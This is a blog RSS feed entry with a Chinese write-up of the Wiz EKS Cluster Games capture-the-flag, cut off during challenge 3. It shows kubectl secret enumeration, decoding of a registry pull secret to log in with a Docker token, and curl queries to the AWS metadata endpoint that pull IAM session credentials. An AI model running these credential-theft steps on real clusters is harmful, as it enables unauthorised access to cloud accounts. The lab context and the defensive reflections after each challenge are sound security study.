<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Wiz on en1r0py</title><link>/tags/wiz/</link><description>Recent content in Wiz on en1r0py</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Tue, 17 Sep 2024 12:53:24 +0800</lastBuildDate><atom:link href="/tags/wiz/index.xml" rel="self" type="application/rss+xml"/><item><title>Wiz Eks Cluster Games</title><link>/posts/2024/wiz-eks-cluster-games/</link><pubDate>Tue, 17 Sep 2024 12:53:24 +0800</pubDate><guid>/posts/2024/wiz-eks-cluster-games/</guid><description>&lt;img src="/img/2024/wiz-eks-cluster-games.jpg" alt="Certificate" class="center" style="width:70%;" /></description><content>&lt;img src="/img/2024/wiz-eks-cluster-games.jpg" alt="Certificate" class="center" style="width:70%;" />
&lt;h2 id="challenge-1-secret-seeker">Challenge 1: Secret Seeker&lt;/h2>
&lt;h3 id="题目">题目&lt;/h3>
&lt;p>Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;secrets&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;get&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;list&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="解题">解题&lt;/h3>
&lt;ol>
&lt;li>题目给出查看全部的secrets&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># kubectl get secrets&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>NAME TYPE DATA AGE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log-rotate Opaque &lt;span style="color:#ae81ff">1&lt;/span> 320d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># kubectl get secrets log-rotate -o yaml&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apiVersion: v1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>data:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> flag: d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ&lt;span style="color:#f92672">==&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>kind: Secret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>metadata:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> creationTimestamp: &lt;span style="color:#e6db74">&amp;#34;2023-11-01T13:02:08Z&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name: log-rotate
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> namespace: challenge1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resourceVersion: &lt;span style="color:#e6db74">&amp;#34;890951&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> uid: 03f6372c-b728-4c5b-ad28-70d5af8d387c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>type: Opaqu
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># echo -n &amp;#34;d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==&amp;#34; | base64 -d&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wiz_eks_challenge&lt;span style="color:#f92672">{&lt;/span>omg_over_privileged_secret_access&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="思考">思考&lt;/h3>
&lt;ul>
&lt;li>对于像 Secrets 这样的敏感资源，拥有 list 和 get 权限是非常强大的。需要谨慎管理这些权限，以保护敏感数据。&lt;/li>
&lt;li>在 Kubernetes 中，访问 Secrets 应该受到严格控制。这些资源可能包含密码和令牌等关键数据，管理谁可以访问它们对于安全至关重要。&lt;/li>
&lt;li>在 Kubernetes 中定期审计权限设置的必要性。这确保了访问级别始终适当，并且敏感信息得到了充分保护。&lt;/li>
&lt;/ul>
&lt;h2 id="challenge-2-registry-hunt">Challenge 2: Registry Hunt&lt;/h2>
&lt;h3 id="题目-1">题目&lt;/h3>
&lt;p>A thing we learned during our research: always check the container registries.
For your convenience, the crane utility is already pre-installed on the machine.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;secrets&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;get&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;pods&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;list&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;get&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="解题-1">解题&lt;/h3>
&lt;ol>
&lt;li>题目给出查看container registries&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># kubectl get pods&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>NAME READY STATUS RESTARTS AGE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>database-pod-2c9b3a4e 1/1 Running &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">(&lt;/span>30d ago&lt;span style="color:#f92672">)&lt;/span> 321d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># kubectl get pods database-pod-2c9b3a4e -o yaml&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apiVersion: v1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>kind: Pod
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>metadata:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> annotations:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kubernetes.io/psp: eks.privileged
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pulumi.com/autonamed: &lt;span style="color:#e6db74">&amp;#34;true&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> creationTimestamp: &lt;span style="color:#e6db74">&amp;#34;2023-11-01T13:32:05Z&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name: database-pod-2c9b3a4e
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> namespace: challenge2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resourceVersion: &lt;span style="color:#e6db74">&amp;#34;113847456&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> uid: 57fe7d43-5eb3-4554-98da-47340d94b4a6
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>spec:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> containers:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - image: eksclustergames/base_ext_image
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> imagePullPolicy: Always
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name: my-container
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resources: &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> terminationMessagePath: /dev/termination-log
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> terminationMessagePolicy: File
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> volumeMounts:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name: kube-api-access-cq4m2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> readOnly: true
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dnsPolicy: ClusterFirst
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> enableServiceLinks: true
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> imagePullSecrets:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - name: registry-pull-secrets-780bab1d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>查看拉取镜像的Secret&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># kubectl get secret registry-pull-secrets-780bab1d -o yaml&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apiVersion: v1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>data:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .dockerconfigjson: eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>kind: Secret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>metadata:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> annotations:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pulumi.com/autonamed: &lt;span style="color:#e6db74">&amp;#34;true&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> creationTimestamp: &lt;span style="color:#e6db74">&amp;#34;2023-11-01T13:31:29Z&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name: registry-pull-secrets-780bab1d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> namespace: challenge2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resourceVersion: &lt;span style="color:#e6db74">&amp;#34;897340&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> uid: 1348531e-57ff-42df-b074-d9ecd566e18b
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>type: kubernetes.io/dockerconfigjson
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># echo -n &amp;#34;eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19&amp;#34; | base64 -d&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;auths&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;index.docker.io/v1/&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;auth&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw==&amp;#34;&lt;/span>&lt;span style="color:#f92672">}}}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># echo -n &amp;#34;ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw==&amp;#34; | base64 -d&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>通过上述docker的登录信息进行登录&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># crane auth login docker.io -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2024/09/17 15:23:09 logged in via /home/user/.docker/config.json
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># crane config docker.io/eksclustergames/base_ext_image&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;architecture&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;amd64&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;config&amp;#34;&lt;/span>:&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Env&amp;#34;&lt;/span>:&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&amp;#34;&lt;/span>&lt;span style="color:#f92672">]&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;Cmd&amp;#34;&lt;/span>:&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/bin/sleep&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;3133337&amp;#34;&lt;/span>&lt;span style="color:#f92672">]&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;ArgsEscaped&amp;#34;&lt;/span>:true,&lt;span style="color:#e6db74">&amp;#34;OnBuild&amp;#34;&lt;/span>:null&lt;span style="color:#f92672">}&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;created&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;2023-11-01T13:32:18.920734382Z&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;history&amp;#34;&lt;/span>:&lt;span style="color:#f92672">[{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;created&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;2023-07-18T23:19:33.538571854Z&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;created_by&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / &amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>,&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;created&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;2023-07-18T23:19:33.655005962Z&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;created_by&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;/bin/sh -c #(nop) CMD [\&amp;#34;sh\&amp;#34;]&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;empty_layer&amp;#34;&lt;/span>:true&lt;span style="color:#f92672">}&lt;/span>,&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;created&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;2023-11-01T13:32:18.920734382Z&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;created_by&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;RUN sh -c echo &amp;#39;wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}&amp;#39; \u003e /flag.txt # buildkit&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;comment&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;buildkit.dockerfile.v0&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>,&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;created&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;2023-11-01T13:32:18.920734382Z&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;created_by&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;CMD [\&amp;#34;/bin/sleep\&amp;#34; \&amp;#34;3133337\&amp;#34;]&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;comment&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;buildkit.dockerfile.v0&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;empty_layer&amp;#34;&lt;/span>:true&lt;span style="color:#f92672">}]&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;os&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;linux&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;rootfs&amp;#34;&lt;/span>:&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;type&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;layers&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;diff_ids&amp;#34;&lt;/span>:&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#34;sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;sha256:a70cef1cb742e242b33cc21f949af6dc7e59b6ea3ce595c61c179c3be0e5d432&amp;#34;&lt;/span>&lt;span style="color:#f92672">]}}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="思考-1">思考&lt;/h3>
&lt;ul>
&lt;li>在生产环境中，使用 Secret 拉取 Docker 镜像是常见的操作，因此需要特别注意 Secret 的权限管理，以确保安全性。&lt;/li>
&lt;li>在 Kubernetes 环境中避免使用公共镜像仓库也同样重要，以进一步防范安全漏洞并保持对软件资源的控制。&lt;/li>
&lt;/ul>
&lt;h2 id="challenge-3-image-inquisition">Challenge 3: Image Inquisition&lt;/h2>
&lt;h3 id="题目-2">题目&lt;/h3>
&lt;p>A pod&amp;rsquo;s image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.
Remember: You are running inside a compromised EKS pod.
For your convenience, the crane utility is already pre-installed on the machine.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;pods&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;list&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;get&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="解题-2">解题&lt;/h3>
&lt;ol>
&lt;li>查看pod相关信息&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># kubectl get pods&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># kubectl get pods accounting-pod-876647f8 -o yaml&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apiVersion: v1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>kind: Pod
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>metadata:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> annotations:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kubernetes.io/psp: eks.privileged
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pulumi.com/autonamed: &lt;span style="color:#e6db74">&amp;#34;true&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> creationTimestamp: &lt;span style="color:#e6db74">&amp;#34;2023-11-01T13:32:10Z&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name: accounting-pod-876647f8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> namespace: challenge3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resourceVersion: &lt;span style="color:#e6db74">&amp;#34;113847436&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> uid: dd2256ae-26ca-4b94-a4bf-4ac1768a54e2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>spec:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> containers:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> imagePullPolicy: IfNotPresent
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name: accounting-container
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resources: &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> terminationMessagePath: /dev/termination-log
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> terminationMessagePolicy: File
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> volumeMounts:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name: kube-api-access-mmvjj
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> readOnly: true
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>此题的镜像是存放在AWS ECR私有仓库内，通过&lt;a href="https://docs.aws.amazon.com/zh_cn/AmazonECR/latest/userguide/registry_auth.html">AWS文档&lt;/a>，登录命令如下&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aws ecr get-login-password --region us-west-1 | docker login --username AWS --password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>尝试使用&lt;code>aws cli&lt;/code>查看登录凭证&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># aws ecr get-login-password --region us-west-1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Unable to locate credentials. You can configure credentials by running &lt;span style="color:#e6db74">&amp;#34;aws configure&amp;#34;&lt;/span>.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
&lt;li>尝试AWS元数据查询登录凭证&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># curl 169.254.169.254/latest/meta-data/iam/security-credentials/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eks-challenge-cluster-nodegroup-NodeInstanceRole
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># curl 169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;AccessKeyId&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;&amp;lt;AccessKeyId&amp;gt;&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;Expiration&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;2024-09-18 16:11:43+00:00&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;SecretAccessKey&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;&amp;lt;SecretAccessKey&amp;gt;&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;SessionToken&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;FwoGZXIvYXdzECEaDHrNSjwyVMWeJoAnySK3AY4Bylma9Ju6Jqbkd/atWMEqk4X6fw3K0rjYBkT6bxgfYJ3XwbO61GPombFlKMeZ68SMTWKRpCz+KF7iG1INS9rnWbIojeTOcobHVEx/JW/nlRbxvFKPBQANAY8YQSC10vt4H2QEnrRWnRvvVixUy8UegYOGFzpp7kAYX34eEFJ1x5fwaOj7hhLDJDsablkGTG4CJE/BAntFw0ncXPbryfqgiKqFnFL35SKp7QicllBtTrMwvYg0Piiv26u3BjItA+IMzCCUJOWEMmZpVeW0H/iqoTF7L32Y/SVDKGJ6KExw3ak46wV6Bw/ky7pY&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># export AWS_ACCESS_KEY_ID=&amp;lt;AccessKeyId&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># export AWS_SECRET_ACCESS_KEY=&amp;lt;AWS_SECRET_ACCESS_KEY&amp;gt;&lt;/span>
